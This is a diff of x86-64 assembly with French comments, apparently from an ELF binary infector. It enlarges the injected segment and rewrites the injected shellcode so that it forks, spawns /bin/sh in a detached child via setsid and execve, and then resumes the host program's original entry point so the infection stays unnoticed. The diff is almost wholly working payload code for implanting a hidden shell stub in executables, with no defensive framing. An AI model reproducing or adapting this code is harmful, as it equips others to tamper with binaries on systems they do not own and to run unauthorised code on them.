@@ -7,9 +7,8 @@ section .data
     segment_offset dq 0x1180    
     segment_vaddr dq 0x1180     
     segment_paddr dq 0x1180     
-    ; Nouvelles tailles adaptées (0x200 devrait être largement suffisant)
-    segment_filesz dq 0x200     ; Taille dans le fichier
-    segment_memsz dq 0x200      ; Taille en mémoire
+    segment_filesz dq 0xE80     ; Taille dans le fichier
+    segment_memsz dq 0xE80      ; Taille en mémoire
 
 section .text
     global _start
@@ -20,16 +19,43 @@ shellcode:
     push rsi
     push rdi
 
-    ; /bin/sh
-    mov rax, 59
-    lea rdi, [rel sh_path]
+    ; fork()
+    mov rax, 57
+    syscall
+
+    cmp rax, 0
+    jl continue_to_prog ; si erreur on continue vers le programme principal
+    je execshell ; si ca vaut 0 on execute le shell
+
+    push rax
+    mov rdi, rax
+    mov rax, 61
     xor rsi, rsi
     xor rdx, rdx
-    syscall   
+    xor r10, r10
+    syscall
+    pop rax
+    jmp continue_to_prog
 
-    pop rdi
-    pop rsi
+execshell:
+    mov rax, 112
+    xor rdi, rdi
+    xor rsi, rsi
+    syscall
+
+     ; /bin/sh
+    mov rax, 59
+    lea rdi, [rel sh_path]
+    lea rsi, [rel argv]
+    xor rdx, rdx
+    syscall
+    ; on continue vers le programme principal dans tous les cas
+    jmp continue_to_prog
+
+continue_to_prog:
     pop rdx
+    pop rsi
+    pop rdi
     pop rax
 
     ; Calcul de l'adresse de base (pour PIE)
@@ -44,6 +70,9 @@ get_base:
     jmp rax                
 
 sh_path db "/bin/sh", 0
+argv:
+    dq sh_path
+    dq 0
 entry_offset dq 0x1060     
 shellcode_end:
     shellcode_len equ shellcode_end - shellcode
